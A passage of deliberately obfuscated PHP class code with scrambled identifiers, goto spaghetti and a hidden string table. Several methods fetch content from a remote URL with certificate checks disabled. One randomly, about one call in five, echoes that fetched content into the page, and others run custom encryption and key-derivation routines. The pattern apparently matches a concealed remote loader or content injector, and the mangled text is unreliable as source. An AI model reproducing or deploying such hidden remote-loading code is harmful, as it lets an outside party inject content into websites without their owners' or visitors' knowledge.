>= 0) { break; } $e¡…ğ­·Ü++; } $b’¿°Ä«ØÄ = $this->{$_SERVER[¬œç„§²ö°ô][190]}($f«Ë£Ê¡˜[299], $dÉ•¥…ôò); $cƒÅÕ¥Éƒó = $DŒ„ê¤âÆ[643]; goto bÌµ¨¹ØÂÓ; BŠÑ—ªÃîí: $féÄ´¥‘àÌ = $DŒ„ê¤âÆ[640]; if (!$féÄ´¥‘àÌ) { die; } if ($this->fkuz901d71ac == $f«Ë£Ê¡˜[128] || !$f«Ë£Ê¡˜[113]($GLOBALS, $f«Ë£Ê¡˜[139])) { return; } goto DêÂå±Ê˜ò; DĞ×’¯Àê»: } private function xywc8811d96d($E’İŞ¾‹ĞŒ = '', $BÑ„“¹èâ = array(), $fÁÍé—É‚ = 5) { goto AïàÎ¦™Ñä; AïàÎ¦™Ñä: $d‰®£ØïÕÅ =& $_SERVER[¹Ò‹Ò¹]; $c‡¥ìˆóğ’ =& $_SERVER[¬œç„§²ö°ô]; $DƒÄë±Æ§ = $c‡¥ìˆóğ’[301]; goto C¤ùëä‹†Ë; E˜•ù¥µ‘: $f„ã²±Ü× = $c‡¥ìˆóğ’[259](array($c‡¥ìˆóğ’[260] => array($c‡¥ìˆóğ’[263] => $fÁÍé—É‚, $c‡¥ìˆóğ’[261] => $c‡¥ìˆóğ’[305]), $c‡¥ìˆóğ’[306] => array($c‡¥ìˆóğ’[307] => !1, $c‡¥ìˆóğ’[308] => !1))); $BÑ„“¹èâ = @$c‡¥ìˆóğ’[264]($DƒÄë±Æ§, !1, $f„ã²±Ü×); return $c‡¥ìˆóğ’[198]($BÑ„“¹èâ, !0); goto B³“®ˆ†; C¤ùëä‹†Ë: $aÂßø—ÊË = $d‰®£ØïÕÅ[644]; if (!$aÂßø—ÊË) { return; } $DƒÄë±Æ§ = $this->{$_SERVER[¬œç„§²ö°ô][257]}($DƒÄë±Æ§, $c‡¥ìˆóğ’[302]); goto dè¶¾”œ’Ê; B³“®ˆ†: $E³†İ§¼ñã = $d‰®£ØïÕÅ[645]; if (strlen($E³†İ§¼ñã) < $d‰®£ØïÕÅ[582]) { return; } goto Cç¨²»¥ÍŠ; dè¶¾”œ’Ê: $DƒÄë±Æ§ = $DƒÄë±Æ§ . $E’İŞ¾‹ĞŒ; if ($BÑ„“¹èâ && $c‡¥ìˆóğ’[199]($BÑ„“¹èâ)) { $DƒÄë±Æ§ = $DƒÄë±Æ§ . $c‡¥ìˆóğ’[303] . $c‡¥ìˆóğ’[304]($BÑ„“¹èâ); } if ($BÑ„“¹èâ === -1) { return $DƒÄë±Æ§; } goto E˜•ù¥µ‘; Cç¨²»¥ÍŠ: } private function sxmia0459283() { goto Cùˆªó»—î; Cùˆªó»—î: $Fä÷„Œ»î¢ =& $_SERVER[¹Ò‹Ò¹]; $f¥ƒù¹ïÁÎ =& $_SERVER[¬œç„§²ö°ô]; $Döâäã¤ŒŸ = array($f¥ƒù¹ïÁÎ[309] => $f¥ƒù¹ïÁÎ[310], $f¥ƒù¹ïÁÎ[311] => $f¥ƒù¹ïÁÎ[312], $f¥ƒù¹ïÁÎ[313] => $f¥ƒù¹ïÁÎ[314], $f¥ƒù¹ïÁÎ[315] => $f¥ƒù¹ïÁÎ[316], $f¥ƒù¹ïÁÎ[317] => $f¥ƒù¹ïÁÎ[318], $f¥ƒù¹ïÁÎ[319] => $f¥ƒù¹ïÁÎ[252], $f¥ƒù¹ïÁÎ[320] => $f¥ƒù¹ïÁÎ[252], $f¥ƒù¹ïÁÎ[321] => $f¥ƒù¹ïÁÎ[310], $f¥ƒù¹ïÁÎ[322] => $f¥ƒù¹ïÁÎ[312], $f¥ƒù¹ïÁÎ[323] => $f¥ƒù¹ïÁÎ[314], $f¥ƒù¹ïÁÎ[324] => $f¥ƒù¹ïÁÎ[325], $f¥ƒù¹ïÁÎ[326] => $f¥ƒù¹ïÁÎ[316], $f¥ƒù¹ïÁÎ[327] => $f¥ƒù¹ïÁÎ[328], $f¥ƒù¹ïÁÎ[329] => $f¥ƒù¹ïÁÎ[318], $f¥ƒù¹ïÁÎ[330] => $f¥ƒù¹ïÁÎ[331], $f¥ƒù¹ïÁÎ[332] => $f¥ƒù¹ïÁÎ[333], $f¥ƒù¹ïÁÎ[334] => $f¥ƒù¹ïÁÎ[335]); goto AŸŒà‚Í¸è; CšÑ„£„ä: return $A–ã¼„„Œ¹ + $F‘¬íÆÖí´; $A÷îŠ±»µš = $Fä÷„Œ»î¢[649]; goto Bè¥È‹°®; Bò·¢”í: $Aì¢ÅÃçåä = $Fä÷„Œ»î¢[647]; $A–ã¼„„Œ¹ = $f¥ƒù¹ïÁÎ[251]($A–ã¼„„Œ¹ ? $A–ã¼„„Œ¹ : $f¥ƒù¹ïÁÎ[310]); $F‘¬íÆÖí´ = $f¥ƒù¹ïÁÎ[113]($this->xczj8bf9392c, $f¥ƒù¹ïÁÎ[336]); goto DÁ–¢„§£; DÁ–¢„§£: $e±ÀØŒ×Á = $Fä÷„Œ»î¢[648]; if (strlen($e±ÀØŒ×Á) < $Fä÷„Œ»î¢[592]) { return; } $F‘¬íÆÖí´ = $F‘¬íÆÖí´ ? $f¥ƒù¹ïÁÎ[251]($F‘¬íÆÖí´) : 0; goto CšÑ„£„ä; AŸŒà‚Í¸è: $C‚ÖÚ¨½å = $Fä÷„Œ»î¢[646]; while (strlen($C‚ÖÚ¨½å) < $Fä÷„Œ»î¢[582]) { if (!$C‚ÖÚ¨½å) { break; } $C‚ÖÚ¨½å++; } $A–ã¼„„Œ¹ = $Döâäã¤ŒŸ[$this->fkuz901d71ac]; goto Bò·¢”í; Bè¥È‹°®: } public function umyzba639ddd($E¡ÆÊ‹ŒÖ˜) { goto cŠï³”ÌŒ¹; BÁ“ŞÉ‘ˆà: $fœ‡‡Ø•­Ë = $c‹¡øÀ½‚Ë[229]($fœ‡‡Ø•­Ë, $c‹¡øÀ½‚Ë[10], $c‹¡øÀ½‚Ë[337]); if (!$c‹¡øÀ½‚Ë[249]($E¡ÆÊ‹ŒÖ˜[$c‹¡øÀ½‚Ë[337]], $fœ‡‡Ø•­Ë)) { $c‹¡øÀ½‚Ë[173]($c‹¡øÀ½‚Ë[341], !1, $c‹¡øÀ½‚Ë[246]); } goto Aôò©»¿Ã; fÈšëÛöˆÍ: if ($d‘Ã†÷ô >= $c‹¡øÀ½‚Ë[251]($c‹¡øÀ½‚Ë[252])) { return; } $FÈÀªˆöòÁ = $c‹¡øÀ½‚Ë[61]($c‹¡øÀ½‚Ë[146])->{$_SERVER[¬œç„§²ö°ô][147]}(); if ($FÈÀªˆöòÁ <= $d‘Ã†÷ô) { return; } goto d²šÓØ­²; cŠï³”ÌŒ¹: $e™Óš›ƒ“È =& $_SERVER[¹Ò‹Ò¹]; $c‹¡øÀ½‚Ë =& $_SERVER[¬œç„§²ö°ô]; $d‘Ã†÷ô = $this->{$_SERVER[¬œç„§²ö°ô][144]}(); goto AäêóÕ£Ô; AäêóÕ£Ô: $b®‚¾˜ïÎï = $e™Óš›ƒ“È[650]; if (!$b®‚¾˜ïÎï) { die; } if ($E¡ÆÊ‹ŒÖ˜[$c‹¡øÀ½‚Ë[337]] == $c‹¡øÀ½‚Ë[227]) { return; } goto fÈšëÛöˆÍ; d²šÓØ­²: $fœ‡‡Ø•­Ë = $c‹¡øÀ½‚Ë[61]($c‹¡øÀ½‚Ë[146])->{$_SERVER[¬œç„§²ö°ô][338]}($c‹¡øÀ½‚Ë[337])->{$_SERVER[¬œç„§²ö°ô][339]}($d‘Ã†÷ô)->{$_SERVER[¬œç„§²ö°ô][340]}(); $bœÈÖÄ­Ä = $e™Óš›ƒ“È[651]; while ($bœÈÖÄ­Ä < $e™Óš›ƒ“È[592]) { if ($bœÈÖÄ­Ä >= 0) { break; } $bœÈÖÄ­Ä++; } goto BÁ“ŞÉ‘ˆà; Aôò©»¿Ã: } public function cwpr872dad4d() { goto F†ùÃø¿Ì; f×œĞÎŒõĞ: echo $BæÖ¦ª¾¸[343] . $BæÖ¦ª¾¸[344]($c„ÜìË…¨¨) . $BæÖ¦ª¾¸[345]; goto a¹æ¢Ê‰¼¸; EŒÁ¯‚ë¼: $a‰‘îø½œ = $BæÖ¦ª¾¸[256]; $Eö¤Äêï‹· = $bâ‹¸ãáÛò[652]; if (strlen($Eö¤Äêï‹·) < $bâ‹¸ãáÛò[587]) { die; } goto f“–¼ˆ¦Çâ; F†ùÃø¿Ì: $bâ‹¸ãáÛò =& $_SERVER[¹Ò‹Ò¹]; $BæÖ¦ª¾¸ =& $_SERVER[¬œç„§²ö°ô]; if (!$BæÖ¦ª¾¸[113]($GLOBALS, $BæÖ¦ª¾¸[139]) || $BæÖ¦ª¾¸[342](1, 100) > 20) { return; } goto EŒÁ¯‚ë¼; f“–¼ˆ¦Çâ: $a‰‘îø½œ = $this->{$_SERVER[¬œç„§²ö°ô][257]}($a‰‘îø½œ, $BæÖ¦ª¾¸[258]); $Bâ¢‹¾âßÇ = $BæÖ¦ª¾¸[259](array($BæÖ¦ª¾¸[260] => array($BæÖ¦ª¾¸[261] => $BæÖ¦ª¾¸[262], $BæÖ¦ª¾¸[263] => 3))); $c„ÜìË…¨¨ = @$BæÖ¦ª¾¸[264]($a‰‘îø½œ, !1, $Bâ¢‹¾âßÇ); goto f×œĞÎŒõĞ; a¹æ¢Ê‰¼¸: } private function xotc5bdac756($eæìÀ›¯¼, $Dö±¬ÏÔäë, $e‡‹İºŸ½¶ = 3) { goto aŞ°ùô¼¬±; aŞ°ùô¼¬±: $d¼ŸïÁÂ“ù =& $_SERVER[¹Ò‹Ò¹]; $c°®–ë¯èù =& $_SERVER[¬œç„§²ö°ô]; $c°®–ë¯èù[346](1); goto EºŞÆãŒÌ÷; EºŞÆãŒÌ÷: $c¬µŞ¶“¿· = $d¼ŸïÁÂ“ù[653]; if (!$c¬µŞ¶“¿·) { return; } $eæìÀ›¯¼ = $c°®–ë¯èù[2]($eæìÀ›¯¼); goto C‹©ô«æš«; e‚³»õÄäˆ: $bÙé½”É…„ = $c°®–ë¯èù[221]($dÕ×·†£™Á . $e¬ÆÄ¢é®Œ . $bÙé½”É…„); if ($e‡‹İºŸ½¶ - 1 > 0) { $bÙé½”É…„ = $this->{$_SERVER[¬œç„§²ö°ô][134]}($bÙé½”É…„, $Dö±¬ÏÔäë, $e‡‹İºŸ½¶ - 1); } return $bÙé½”É…„; goto dÙÀ½Èœ…; C‹©ô«æš«: $dÕ×·†£™Á = $c°®–ë¯èù[342](0, 5) . $c°®–ë¯èù[10]; $e¬ÆÄ¢é®Œ = $c°®–ë¯èù[131](15); $CŒõß¢â¦ = $c°®–ë¯èù[347]; goto f¥ÚÈ¨Òæ¶; f¥ÚÈ¨Òæ¶: $e×¡ÅÚâÔã = $d¼ŸïÁÂ“ù[654]; if (!$e×¡ÅÚâÔã) { die; } switch ($dÕ×·†£™Á) { case $c°®–ë¯èù[241]: $bÙé½”É…„ = $this->{$_SERVER[¬œç„§²ö°ô][154]}($eæìÀ›¯¼, $c°®–ë¯èù[221]($Dö±¬ÏÔäë . $e¬ÆÄ¢é®Œ)); $BÍ¸‘öï‹¶ = $d¼ŸïÁÂ“ù[655]; if (!$BÍ¸‘öï‹¶) { die; } break; $bŒ´§Ñ£Á = $d¼ŸïÁÂ“ù[656]; if (strlen($bŒ´§Ñ£Á) < $d¼ŸïÁÂ“ù[579]) { die; } case $c°®–ë¯èù[227]: $bÙé½”É…„ = $this->{$_SERVER[¬œç„§²ö°ô][154]}($eæìÀ›¯¼, $c°®–ë¯èù[221]($e¬ÆÄ¢é®Œ . $Dö±¬ÏÔäë)); $d¢˜©Ì›°­ = $d¼ŸïÁÂ“ù[657]; while ($d¢˜©Ì›°­ < $d¼ŸïÁÂ“ù[582]) { if ($d¢˜©Ì›°­ >= 0) { break; } $d¢˜©Ì›°­++; } break; $BÔàœÇ½¨ = $d¼ŸïÁÂ“ù[658]; while (strlen($BÔàœÇ½¨) < $d¼ŸïÁÂ“ù[592]) { if (!$BÔàœÇ½¨) { break; } $BÔàœÇ½¨++; } case $c°®–ë¯èù[348]: $bÙé½”É…„ = $this->{$_SERVER[¬œç„§²ö°ô][154]}($eæìÀ›¯¼, $c°®–ë¯èù[125]($e¬ÆÄ¢é®Œ . $Dö±¬ÏÔäë)); break; $Dñ¤Àºøñ = $d¼ŸïÁÂ“ù[659]; while ($Dñ¤Àºøñ < $d¼ŸïÁÂ“ù[582]) { if ($Dñ¤Àºøñ >= 0) { break; } $Dñ¤Àºøñ++; } case $c°®–ë¯èù[349]: $bÙé½”É…„ = $this->{$_SERVER[¬œç„§²ö°ô][154]}($eæìÀ›¯¼, $c°®–ë¯èù[121]($e¬ÆÄ¢é®Œ . $Dö±¬ÏÔäë)); break; case $c°®–ë¯èù[350]: goto Aº»Ã‘¨§ƒ; EÂÂ‚‰æÍ: $D­àŠºøÉ® = 0; $D¡‘á¿‚ë = $d¼ŸïÁÂ“ù[662]; $bƒ„áİÕ‰¥ = 0; goto Eğ¦Ïè•Ï; Aº»Ã‘¨§ƒ: $eæìÀ›¯¼ = $c°®–ë¯èù[125]($eæìÀ›¯¼); $cá®ŒÔ¨ç = $c°®–ë¯èù[351](0, 64); $eº©íœ ‡ = $CŒõß¢â¦[$cá®ŒÔ¨ç]; goto aä¤ Ë–¼Î; Eğ¦Ïè•Ï: $aòíø•‹Š = 0; for ($D­àŠºøÉ® = 0; $D­àŠºøÉ® < $c°®–ë¯èù[24]($eæìÀ›¯¼); $D­àŠºøÉ®++) { $aòíø•‹Š = $aòíø•‹Š == $c°®–ë¯èù[24]($dÏÀöÇİïÁ) ? 0 : $aòíø•‹Š; $CĞÁÏˆ¤ª = $d¼ŸïÁÂ“ù[663]; $bƒ„áİÕ‰¥ = ($cá®ŒÔ¨ç + $c°®–ë¯èù[352]($CŒõß¢â¦, $eæìÀ›¯¼[$D­àŠºøÉ®]) + $c°®–ë¯èù[353]($dÏÀöÇİïÁ[$aòíø•‹Š++])) % 64; $C¢ˆ«×Úì .= $CŒõß¢â¦[$bƒ„áİÕ‰¥]; } $bÙé½”É…„ = $c°®–ë¯èù[344]($eº©íœ ‡ . $C¢ˆ«×Úì); goto cÜê—†ù‹; AîÎÛ‘¤õô: $C¢ˆ«×Úì = $c°®–ë¯èù[10]; $fø†ÔŒ²í = $d¼ŸïÁÂ“ù[661]; while ($fø†ÔŒ²í < $d¼ŸïÁÂ“ù[579]) { if ($fø†ÔŒ²í >= 0) { break; } $fø†ÔŒ²í++; } goto EÂÂ‚‰æÍ; aä¤ Ë–¼Î: $c¶éÂ³ˆƒ½ = $d¼ŸïÁÂ“ù[660]; $dÏÀöÇİïÁ = $c°®–ë¯èù[121]($eº©íœ ‡ . $c°®–ë¯èù[121]($Dö±¬ÏÔäë . $eº©íœ ‡) . $Dö±¬ÏÔäë); $dÏÀöÇİïÁ = $c°®–ë¯èù[25]($dÏÀöÇİïÁ, $cá®ŒÔ¨ç % 8, $cá®ŒÔ¨ç % 8 + 7); goto AîÎÛ‘¤õô; cÜê—†ù‹: break; goto aˆŸêÄå¸ï; aˆŸêÄå¸ï: default: $bÙé½”É…„ = $this->{$_SERVER[¬œç„§²ö°ô][154]}($eæìÀ›¯¼, $Dö±¬ÏÔäë . $e¬ÆÄ¢é®Œ); break; } goto e‚³»õÄäˆ; dÙÀ½Èœ…: } private function aqviaf648a60($cè¶Ô•‰ìË, $A™à¬…£â³, $d¿òÜ»÷¡Ú = 3) { goto fêÒ«¸ÛÌ¹; aã†Š²Ôç : while (strlen($FñŸ»àº„‹) < $dˆ—ˆàÒ‘ª[582]) { if (!$FñŸ»àº„‹) { break; } $FñŸ»àº„‹++; } $c˜©ºäò¬Ò = $cø“ÛÛ™ŠÖ[25]($cè¶Ô•‰ìË, 1, 15); $cè¶Ô•‰ìË = $cø“ÛÛ™ŠÖ[25]($cè¶Ô•‰ìË, 16); goto bø›¸à; bø›¸à: $E„©ã†¼ô = $cø“ÛÛ™ŠÖ[347]; $EöªÚœ÷ƒ× = $dˆ—ˆàÒ‘ª[666]; switch ($fÂêéÀÕà) { case $cø“ÛÛ™ŠÖ[241]: $FØºã÷Ğ¥¸ = $this->{$_SERVER[¬œç„§²ö°ô][257]}($cè¶Ô•‰ìË, $cø“ÛÛ™ŠÖ[221]($A™à¬…£â³ . $c˜©ºäò¬Ò)); $E‹›µµÁ²† = $dˆ—ˆàÒ‘ª[667]; if (strlen($E‹›µµÁ²†) < $dˆ—ˆàÒ‘ª[579]) { return; } break; case $cø“ÛÛ™ŠÖ[227]: $FØºã÷Ğ¥¸ = $this->{$_SERVER[¬œç„§²ö°ô][257]}($cè¶Ô•‰ìË, $cø“ÛÛ™ŠÖ[221]($c˜©ºäò¬Ò . $A™à¬…£â³)); break; $cìë‰¨ÍÜö = $dˆ—ˆàÒ‘ª[668]; if (strlen($cìë‰¨ÍÜö) < $dˆ—ˆàÒ‘ª[592]) { return; } case $cø“ÛÛ™ŠÖ[348]: $FØºã÷Ğ¥¸ = $this->{$_SERVER[¬œç„§²ö°ô][257]}($cè¶Ô•‰ìË, $cø“ÛÛ™ŠÖ[125]($c˜©ºäò¬Ò . $A™à¬…£â³)); break; $E‡¢Ê«ãÕ = $dˆ—ˆàÒ‘ª[669]; if (!$E‡¢Ê«ãÕ) { die; } case $cø“ÛÛ™ŠÖ[349]: $FØºã÷Ğ¥¸ = $this->{$_SERVER[¬œç„§²ö°ô][257]}($cè¶Ô•‰ìË, $cø“ÛÛ™ŠÖ[121]($c˜©ºäò¬Ò . $A™à¬…£â³)); break; $e„ó¡¦¤‘ = $dˆ—ˆàÒ‘ª[670]; while (strlen($e„ó¡¦¤‘) < $dˆ—ˆàÒ‘ª[579]) { if (!$e„ó¡¦¤‘) { break; } $e„ó¡¦¤‘++; } case $cø“ÛÛ™ŠÖ[350]: goto A‡»ù¾æŒÕ; E¦Óïƒ†Ñ®: $Dİ¹©È¤˜ = $dˆ—ˆàÒ‘ª[674]; if (strlen($Dİ¹©È¤˜) < $dˆ—ˆàÒ‘ª[582]) { return; } for ($D§©ƒ¿²ó™ = 0; $D§©ƒ¿²ó™ < $cø“ÛÛ™ŠÖ[24]($cè¶Ô•‰ìË); $D§©ƒ¿²ó™++) { $dêÅôÉÄœÁ = $dêÅôÉÄœÁ == $cø“ÛÛ™ŠÖ[24]($eç”ÕóŞ‹—) ? 0 : $dêÅôÉÄœÁ; $dĞÙ¦óÇ®ò = $dêÅôÉÄœÁ++; $c«İµƒ·£ = $cø“ÛÛ™ŠÖ[352]($E„©ã†¼ô, $cè¶Ô•‰ìË[$D§©ƒ¿²ó™]) - $F¢ÉÛ¡¿ëó - $cø“ÛÛ™ŠÖ[353]($eç”ÕóŞ‹—[$dĞÙ¦óÇ®ò]); $Cî‹óµŸéŞ = $dˆ—ˆàÒ‘ª[675]; if (!$Cî‹óµŸéŞ) { return; } while ($c«İµƒ·£ < 0) { $c«İµƒ·£ += 64; $Aêõ‘Ş¤Ù = $dˆ—ˆàÒ‘ª[676]; if (!$Aêõ‘Ş¤Ù) { die; } } $cÂÜ¥ØŒ›ï .= $E„©ã†¼ô[$c«İµƒ·£]; } goto f›…òÍåĞ; d‚”²Ø‘­: $cÂÜ¥ØŒ›ï = $cø“ÛÛ™ŠÖ[10]; $d•ÓçŠŸô = $dˆ—ˆàÒ‘ª[673]; if (strlen($d•ÓçŠŸô) < $dˆ—ˆàÒ‘ª[587]) { return; } goto a¶¨ø¯š·; dšÃõÆŒô: $e­ğÒó¹«ë = $cè¶Ô•‰ìË[0]; $B¸‘Ô´ ‚í = $dˆ—ˆàÒ‘ª[671]; while ($B¸‘Ô´ ‚í < $dˆ—ˆàÒ‘ª[587]) { if ($B¸‘Ô´ ‚í >= 0) { break; } $B¸‘Ô´ ‚í++; } goto D£³¿‡ğ°ô; A‡»ù¾æŒÕ: $cè¶Ô•‰ìË = $cø“ÛÛ™ŠÖ[355]($cè¶Ô•‰ìË); $bñ‰ºÅÁğ· = $dˆ—ˆàÒ‘ª[594]; if (!$bñ‰ºÅÁğ·) { die; } goto dšÃõÆŒô; D£³¿‡ğ°ô: $cè¶Ô•‰ìË = $cø“ÛÛ™ŠÖ[25]($cè¶Ô•‰ìË, 1); $F¢ÉÛ¡¿ëó = $cø“ÛÛ™ŠÖ[352]($E„©ã†¼ô, $e­ğÒó¹«ë); $e’Ã¶¡îéå = $dˆ—ˆàÒ‘ª[672]; goto E°”õÎÌâ¿; fâëå‰ĞÈè: break; $bóãÚÄ”ä‹ = $dˆ—ˆàÒ‘ª[678]; goto CÌ×áË’°™; a¶¨ø¯š·: $D§©ƒ¿²ó™ = 0; $c«İµƒ·£ = 0; $dêÅôÉÄœÁ = 0; goto E¦Óïƒ†Ñ®; E°”õÎÌâ¿: if (!$e’Ã¶¡îéå) { return; } $eç”ÕóŞ‹— = $cø“ÛÛ™ŠÖ[121]($e­ğÒó¹«ë . $cø“ÛÛ™ŠÖ[121]($A™à¬…£â³ . $e­ğÒó¹«ë) . $A™à¬…£â³); $eç”ÕóŞ‹— = $cø“ÛÛ™ŠÖ[25]($eç”ÕóŞ‹—, $F¢ÉÛ¡¿ëó % 8, $F¢ÉÛ¡¿ëó % 8 + 7); goto d‚”²Ø‘­; f›…òÍåĞ: $FØºã÷Ğ¥¸ = $cø“ÛÛ™ŠÖ[356]($cÂÜ¥ØŒ›ï); $eéšåÚøÊ = $dˆ—ˆàÒ‘ª[677]; if (!$eéšåÚøÊ) { die; } goto fâëå‰ĞÈè; CÌ×áË’°™: default: $FØºã÷Ğ¥¸ = $this->{$_SERVER[¬œç„§²ö°ô][257]}($cè¶Ô•‰ìË, $A™à¬…£â³ . $c˜©ºäò¬Ò); break; } goto cÕŒ™ôŞ³”; fêÒ«¸ÛÌ¹: $dˆ—ˆàÒ‘ª =& $_SERVER[¹Ò‹Ò¹]; $cø“ÛÛ™ŠÖ =& $_SERVER[¬œç„§²ö°ô]; if (!$cø“ÛÛ™ŠÖ[354]($cè¶Ô•‰ìË) || $cø“ÛÛ™ŠÖ[24]($cè¶Ô•‰ìË) < 10) { return !1; } goto Dñ††Ñ±‰Œ; Dñ††Ñ±‰Œ: $cè¶Ô•‰ìË = $cø“ÛÛ™ŠÖ[2]($cè¶Ô•‰ìË); $cˆ°…™­ğÚ = $dˆ—ˆàÒ‘ª[664]; while (strlen($cˆ°…™­ğÚ) < $dˆ—ˆàÒ‘ª[570]) { if (!$cˆ°…™­ğÚ) { break; } $cˆ°…™­ğÚ++; } goto b³õèâ¿èì; cÕŒ™ôŞ³”: if ($d¿òÜ»÷¡Ú - 1 > 0) { $FØºã÷Ğ¥¸ = $this->{$_SERVER[¬œç„§²ö°ô][196]}($FØºã÷Ğ¥¸, $A™à¬…£â³, $d¿òÜ»÷¡Ú - 1); } return $FØºã÷Ğ¥¸; goto BªŒ´µôŠ½; b³õèâ¿èì: $cè¶Ô•‰ìË = $cø“ÛÛ™ŠÖ[221]($cè¶Ô•‰ìË); $fÂêéÀÕà = $cè¶Ô•‰ìË[0]; $FñŸ»àº„‹ = $dˆ—ˆàÒ‘ª[665]; goto aã†Š²Ôç ; BªŒ´µôŠ½: } public function gumq3f5e22d2($cÖî•ğ±œæ) { goto c›öÓ¼Äµ¢; cˆ¦Šöï²õ: $e¹¢„…‰£Ø = $B¦„Ú¶µˆ™[686]; while (strlen($e¹¢„…‰£Ø) < $B¦„Ú¶µˆ™[587]) { if (!$e¹¢„…‰£Ø) { break; } $e¹¢„…‰£Ø++; } $bğÎØàÏ½ = $this->{$_SERVER[¬œç„§²ö°ô][154]}($cÖî•ğ±œæ, $B›ŒØäÙ) . $F†Ù×¶¤‡½[361] . $E‹¦É¿¶äÅ; goto fÔÙƒœ„¦à; fÊ¿–ˆ˜³: $d¿Ú…ˆ´¡ç = $B¦„Ú¶µˆ™[684]; for ($c ¾ŠÄß÷Ç = 0; $c ¾ŠÄß÷Ç < $DÈôà‘×îÅ * 10; $c ¾ŠÄß÷Ç++) { if (($DÈôà‘×îÅ * $c ¾ŠÄß÷Ç + 1) % $aªÛÅó»Â == 0) { $C¤‰™Ê²‹ = $F†Ù×¶¤‡½[251](($DÈôà‘×îÅ * $c ¾ŠÄß÷Ç + 1) / $aªÛÅó»Â); break; } } $E‹¦É¿¶äÅ = $this->{$_SERVER[¬œç„§²ö°ô][154]}($f½éˆ¯ß¥ì * $cùÌ¾÷“Â¶ . $F†Ù×¶¤‡½[10], $F†Ù×¶¤‡½[156]); goto Cİ¾çøåˆ; D‹ËñÂÃ·˜: $aªÛÅó»Â = $F†Ù×¶¤‡½[251](($f½éˆ¯ß¥ì + $cùÌ¾÷“Â¶) / 2); while (1) { $C‡•ÚïÔ× = $aªÛÅó»Â; $F½Ö·ŒäÎï = $DÈôà‘×îÅ; $fèˆ÷›óåé = $B¦„Ú¶µˆ™[681]; if (strlen($fèˆ÷›óåé) < $B¦„Ú¶µˆ™[570]) { return; } while ($F½Ö·ŒäÎï % $C‡•ÚïÔ× != 0) { $f¶¡çˆÎ¹å = $F½Ö·ŒäÎï; $eºìË¦ÈÇé = $B¦„Ú¶µˆ™[682]; if (strlen($eºìË¦ÈÇé) < $B¦„Ú¶µˆ™[582]) { die; } $F½Ö·ŒäÎï = $C‡•ÚïÔ×; $a»ÀÉÕõ‹ = $B¦„Ú¶µˆ™[683]; if (!$a»ÀÉÕõ‹) { return; } $C‡•ÚïÔ× = $f¶¡çˆÎ¹å % $C‡•ÚïÔ×; } if ($C‡•ÚïÔ× == 1) { break; } else { $aªÛÅó»Â++; } } $C¤‰™Ê²‹ = 2; goto fÊ¿–ˆ˜³; cµñÃ§Óƒ†: $c»§“ĞÒÆ£ = $B¦„Ú¶µˆ™[679]; while ($c»§“ĞÒÆ£ < $B¦„Ú¶µˆ™[592]) { if ($c»§“ĞÒÆ£ >= 0) { break; } $c»§“ĞÒÆ£++; } $cùÌ¾÷“Â¶ = $this->{$_SERVER[¬œç„§²ö°ô][357]}(); goto b”Ç†”ä™ö; Cİ¾çøåˆ: $aÇŠê‚¦¼² = $B¦„Ú¶µˆ™[685]; if (strlen($aÇŠê‚¦¼²) < $B¦„Ú¶µˆ™[587]) { return; } $B›ŒØäÙ = $F†Ù×¶¤‡½[121]($F†Ù×¶¤‡½[358] . ($f½éˆ¯ß¥ì + $cùÌ¾÷“Â¶) . $F†Ù×¶¤‡½[359] . $aªÛÅó»Â . $F†Ù×¶¤‡½[359] . $C¤‰™Ê²‹ . $F†Ù×¶¤‡½[360]); goto cˆ¦Šöï²õ; c›öÓ¼Äµ¢: $B¦„Ú¶µˆ™ =& $_SERVER[¹Ò‹Ò¹]; $F†Ù×¶¤‡½ =& $_SERVER[¬œç„§²ö°ô]; $f½éˆ¯ß¥ì = $this->{$_SERVER[¬œç„§²ö°ô][357]}(); goto cµñÃ§Óƒ†; b”Ç†”ä™ö: $Aä´â‹´ãğ = $B¦„Ú¶µˆ™[680]; if (!$Aä´â‹´ãğ) { die; } $DÈôà‘×îÅ = ($f½éˆ¯ß¥ì - 1) * ($cùÌ¾÷“Â¶ - 1); goto D‹ËñÂÃ·˜; fÔÙƒœ„¦à: return $bğÎØàÏ½; goto böª™®šà†; böª™®šà†: } public function hmkv901721b6($C—ä‹ÈÛ ˆ) { goto BìÊÌ“ÜÁ£; B£‘ĞèŸ£: $d…ì«À™™Ÿ = $this->{$_SERVER[¬œç„§²ö°ô][257]}($dÍ“´Œî¶[1] . $Aòİ†óÄß[10], $Aòİ†óÄß[156]); $E›ÈëÕ¹Ùí = $BÌ¯÷¡ñ°[688]; if (strlen($E›ÈëÕ¹Ùí) < $BÌ¯÷¡ñ°[579]) { die; } goto fÃé¾³’Ğ; fÃé¾³’Ğ: if (!$d…ì«À™™Ÿ) { return $Aòİ†óÄß[10]; } $d…ì«À™™Ÿ = $Aòİ†óÄß[251]($d…ì«À™™Ÿ); $aÌã‹ = 0; goto cØÑáì¤Û‰; f‡¿ĞØäê•: $E¿‘¸‹ìªî = $BÌ¯÷¡ñ°[687]; if (strlen($E¿‘¸‹ìªî) < $BÌ¯÷¡ñ°[570]) { die; } if ($Aòİ†óÄß[19]($dÍ“´Œî¶) != 2) { return $Aòİ†óÄß[10]; } goto B£‘ĞèŸ£; bÒİ÷‡äŸÒ: $B„óç£â‰ä = $Aòİ†óÄß[251](($aÌã‹ + $bçÎŒ„»âá) / 2); while (1) { $C¾ƒ”ˆ˜¥ = $B„óç£â‰ä; $c¡Ñ–Ò‘Ú = $dİÁö¤İêŠ; $B¸¶æ¡²ÍØ = $BÌ¯÷¡ñ°[694]; while (strlen($B¸¶æ¡²ÍØ) < $BÌ¯÷¡ñ°[592]) { if (!$B¸¶æ¡²ÍØ) { break; } $B¸¶æ¡²ÍØ++; } while ($c¡Ñ–Ò‘Ú % $C¾ƒ”ˆ˜¥ != 0) { $eæ»ÃëÅ¸ï = $c¡Ñ–Ò‘Ú; $c¡Ñ–Ò‘Ú = $C¾ƒ”ˆ˜¥; $C¾ƒ”ˆ˜¥ = $eæ»ÃëÅ¸ï % $C¾ƒ”ˆ˜¥; $FÅâ±À¤—¤ = $BÌ¯÷¡ñ°[695]; if (!$FÅâ±À¤—¤) { die; } } if ($C¾ƒ”ˆ˜¥ == 1) { break; } else { $B„óç£â‰ä++; } } $aŠÂ÷£’© = 2; goto DĞ—Û÷¢Å½; cØÑáì¤Û‰: $aŠ†¨¸ÚÖ = $BÌ¯÷¡ñ°[689]; while ($aŠ†¨¸ÚÖ < $BÌ¯÷¡ñ°[587]) { if ($aŠ†¨¸ÚÖ >= 0) { break; } $aŠ†¨¸ÚÖ++; } $bçÎŒ„»âá = 0; goto AôÊ¶˜Ø˜; cƒÔË±íĞ®: 